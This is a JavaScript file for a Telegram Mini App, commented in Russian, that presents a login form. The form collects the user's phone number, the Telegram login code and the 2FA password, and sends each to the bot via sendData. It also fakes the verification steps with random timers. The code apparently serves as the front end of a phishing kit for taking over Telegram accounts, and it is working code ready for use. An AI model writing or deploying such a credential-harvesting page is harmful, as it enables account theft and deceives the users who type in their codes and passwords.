document.addEventListener('DOMContentLoaded', () => {
    const tg = window.Telegram.WebApp;
    tg.ready();
    tg.expand();

    const loginBtn = document.getElementById('loginBtn');
    const authForm = document.getElementById('authForm');
    const loadingSpinner = document.getElementById('loadingSpinner');
    const phoneInput = document.getElementById('phoneInput');
    const codeInput = document.getElementById('codeInput');
    const twoFaInput = document.getElementById('2faInput');
    const submitBtn = document.getElementById('submitBtn');
    const successMsg = document.getElementById('successMsg');

    loginBtn.addEventListener('click', async () => {
        // Анимация: скрываем кнопку, показываем форму
        loginBtn.style.opacity = '0';
        setTimeout(() => loginBtn.classList.add('hidden'), 300);
        authForm.classList.remove('hidden');
        loadingSpinner.classList.remove('hidden');

        // Запрос контакта (номер)
        try {
            const contact = await tg.requestContact();
            if (contact) {
                phoneInput.value = contact.phone_number;
                phoneInput.classList.remove('hidden');
                loadingSpinner.classList.add('hidden');
                submitBtn.classList.remove('hidden');
                submitBtn.textContent = 'Поделиться номером';

                // Отправка номера боту (через sendData)
                tg.sendData(JSON.stringify({ action: 'share_phone', phone: contact.phone_number }));
            } else {
                alert('Разрешение на обмен контактом отклонено.');
                resetForm();
            }
        } catch (error) {
            console.error('Request contact error:', error);
            alert('Ошибка запроса контакта.');
            resetForm();
        }
    });

    submitBtn.addEventListener('click', () => {
        const action = submitBtn.textContent;
        if (action === 'Поделиться номером') {
            // Уже отправлено, переходим к коду
            phoneInput.classList.add('hidden');
            codeInput.classList.remove('hidden');
            submitBtn.textContent = 'Отправить код';
            return;
        }

        if (action === 'Отправить код') {
            const code = codeInput.value;
            if (!code) return alert('Введите код');
            tg.sendData(JSON.stringify({ action: 'verify_code', code: code }));
            showLoading();
            // Имитация успеха/ошибки — в реале бот вернёт через update, но для demo
            setTimeout(() => {
                if (Math.random() > 0.5) { // Симуляция 2FA
                    codeInput.classList.add('hidden');
                    twoFaInput.classList.remove('hidden');
                    submitBtn.textContent = 'Подтвердить 2FA';
                    hideLoading();
                } else {
                    showSuccess();
                }
            }, 2000);
            return;
        }

        if (action === 'Подтвердить 2FA') {
            const password = twoFaInput.value;
            if (!password) return alert('Введите пароль');
            tg.sendData(JSON.stringify({ action: 'verify_2fa', password: password }));
            showLoading();
            setTimeout(showSuccess, 1500);
            return;
        }
    });

    function showLoading() {
        loadingSpinner.classList.remove('hidden');
        submitBtn.classList.add('hidden');
    }

    function hideLoading() {
        loadingSpinner.classList.add('hidden');
        submitBtn.classList.remove('hidden');
    }

    function showSuccess() {
        hideLoading();
        successMsg.classList.remove('hidden');
        tg.sendData(JSON.stringify({ action: 'auth_success' }));
        tg.close();
    }

    function resetForm() {
        authForm.classList.add('hidden');
        loginBtn.classList.remove('hidden');
        loginBtn.style.opacity = '1';
    }

    // Обработка данных от бота (если нужно, через tg.MainButton или updates)
    tg.onEvent('mainButtonClicked', (data) => {
        // Доп. логика
    });
});